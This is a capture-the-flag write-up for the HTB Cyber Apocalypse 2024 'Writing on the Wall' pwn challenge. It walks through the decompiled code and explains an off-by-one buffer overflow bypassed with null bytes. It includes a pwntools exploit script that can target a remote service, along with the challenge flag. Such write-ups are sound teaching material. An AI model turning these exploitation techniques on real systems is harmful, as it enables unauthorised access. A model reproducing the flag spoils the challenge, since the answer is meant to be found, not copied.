## Writing on the Wall [Very Easy]
### Initial Analysis
Basic verification of protections and possible vulnerabilities. As we can see, again all the binary protections are active, since it's a very easy challenge, again it shouldn't involve Buffer Overflow, ROP, or anything like that
```bash
~/writing-on-the-wall $ checksec writing_on_the_wall_patched
[*] '/home/flame/0x/ctf/htb-cyber-apocalypse-2024/pwn/writing-on-the-wall/challenge/writing_on_the_wall_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

~/writing-on-the-wall $ cwe_checker writing_on_the_wall_patched
[CWE337] (0.1) RNG seed function srand at 001014e6 is seeded with predictable seed source.
```

Decompiled binary pseudo-C code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[6]; // [rsp+Ah] [rbp-16h] BYREF
  char s2[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  *(_QWORD *)s2 = ' ssapt3w';
  read(0, buf, 7uLL);
  if ( !strcmp(buf, s2) )
    open_door();
  else
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  return 0;
}

unsigned __int64 open_door()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
    exit(1);
  }
  printf("You managed to open the door! Here is the password for the next one: ");
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);
  return v3 - __readfsqword(0x28u);
}
```

The aim here is to access the open_door function, which will print out the challenge flag. To do this, we need to go through the if statement that checks if our input is equal to `s2` (**w3tpass**)
```c
s2 = 'ssapt3w';
read(0, buf, 7uLL);
if ( !strcmp(buf, s2) )
	open_door();
```

### Solution
The actual issue is that our input buffer size is `0x6` bytes, while the variable to be compared is 8 bytes, which causes a 1-byte overflow. To bypass this, we can just send **null bytes** as input, so it will compare **null byte** with **null byte**
```bash
~/writing-on-the-wall $ python2 -c "print '\x00' * 7" | ./writing_on_the_wall_patched

The writing on the wall seems unreadable, can you figure it out?
>> You managed to open the door! Here is the password for the next one: HTB{f4k3_fl4g_4_t35t1ng}
```

Thats our final exploit:
```python
#!/usr/bin/env python3
from pwn import *
import os

def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": "/bin/bash"}
        )
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


prompt = ">> ".encode("utf-8")
slap = lambda y: p.sendlineafter(prompt, y)

exe = "./writing_on_the_wall_patched"
elf = context.binary = ELF(exe, checksec=False)

p = start()

slap(b"\x00" * 7)

flag = p.recvline().split()[-1].decode()
info("Flag: " + flag)
```

> Flag: `HTB{3v3ryth1ng_15_r34d4bl3}`
